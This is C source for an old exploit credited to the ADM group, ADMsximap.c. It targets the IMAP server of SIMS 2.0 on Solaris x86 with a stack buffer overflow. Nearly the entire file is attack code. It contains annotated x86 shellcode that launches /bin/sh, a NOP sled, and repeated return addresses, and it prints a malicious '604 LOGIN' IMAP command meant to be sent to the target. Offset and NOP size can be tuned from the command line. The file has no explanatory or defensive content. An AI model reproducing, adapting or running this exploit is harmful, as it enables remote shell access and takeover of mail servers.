/*      Copyright (c) 2000 ADM                                  */
/*      All Rights Reserved                                     */
/*      THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF ADM      */
/*      The copyright notice above does not evidence any        */
/*      actual or intended publication of such source code.     */
/*                                                              */
/*      Title:        ADMsximap.c  (ADM Solaris X86 IMAP .c)    */
/*      Tested under: SIMS 2.0, fixed now                       */
/*      By:           K2                                        */
/*      Discoverd by: DiGiT                                     */
/*      Shellcode by: cheez                                     */
/*      GROUP EFFORT*@$()!*$#(&@!*(!$                           */
/*                                                              */


#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shell[] =
/*  0 */ "\xeb\x2d"                         /* jmp springboard      */
/* start:                                                           */
/*  2 */ "\x5e"                             /* popl %esi            */
/*  3 */ "\x31\xdb"                         /* xor %ebx,%ebx        */
/*  5 */ "\x88\x5e\x07"                     /* movb %bl,0x7(%esi)   */
/*  8 */ "\x89\x5e\x0c"                     /* movl %ebx,0xc(%esi)  */
/* 11 */ "\x89\x5e\x13"                     /* movl %ebx,0x13(%esi) */
/* 14 */ "\x88\x5e\x18"                     /* movb %bl,0x18(%esi)  */
/* 17 */ "\xb3\x80"                         /* movb $0x80,%bl       */
/* 19 */ "\x28\x5e\xed"                     /* subb %bl,-0x13(%esi) */
/* 22 */ "\x28\x5e\xf1"                     /* subb %bl,-0xf(%esi)  */
/* 25 */ "\x28\x5e\xf7"                     /* subb %bl,-0x9(%esi)  */
/* 28 */ "\x28\x5e\xf8"                     /* subb %bl,-0x8(%esi)  */
/* 31 */ "\x31\xc0"                         /* xor %eax,%eax        */
/* 33 */ "\xd0"                             /* pushl %eax           */
/* 34 */ "\x8d\x5e\x08"                     /* leal 0x8(%esi),%ebx  */
/* 37 */ "\xd3"                             /* pushl %ebx           */
/* 38 */ "\x8d\x1e"                         /* leal (%esi),%ebx     */
/* 40 */ "\x89\x5e\x08"                     /* movl %ebx,0x8(%esi)  */
/* 43 */ "\xd3"                             /* pushl %ebx           */
/* 44 */ "\xd0"                             /* pushl %eax           */
/* 45 */ "\xeb\x15"                         /* jmp exec             */
/* springboard:                                                     */
/* 47 */ "\xe8\xce\xff\xff\xff"             /* call start           */
/* data:                                                            */
/* 52 */ "\x2f\x62\x69\x6e\x2f\x73\x68\xff" /* DATA                 */
/* 60 */ "\xff\xff\xff\xff"                 /* DATA                 */
/* 64 */ "\xff\xff\xff\xff"                 /* DATA                 */
/* execve:                                                          */
/* 68 */ "\xb0\x3b"                         /* movb $0x3b,%al       */
/* 70 */ "\x9a\xff\xff\xff\xff\x07\xff";    /* lcall 0x7,0x0        */


#define SIZE   1600
#define NOPDEF 631
#define DEFOFF -111

const char x86_nop=0x90;
long nop=NOPDEF,esp=0x80472a0;
long offset=DEFOFF;
char buffer[SIZE];

int main (int argc, char *argv[])
{
    int i;

    if (argc > 1) offset += strtol(argv[1], NULL, 0);
    if (argc > 2) nop += strtoul(argv[2], NULL, 0);

    memset(buffer, x86_nop, SIZE);
    memcpy(buffer+nop, shell, strlen(shell));
    for (i = (nop+strlen(shell)); i < SIZE; i += 4) {
        *((int *) &buffer[i]) = esp+offset;
    }
    
    fprintf(stderr,"offset = 0x%x\tstrlen %d\n",esp+offset,strlen(buffer));
    printf("604 LOGIN \"%s\" pass\r\n", buffer);

    return 0;
}
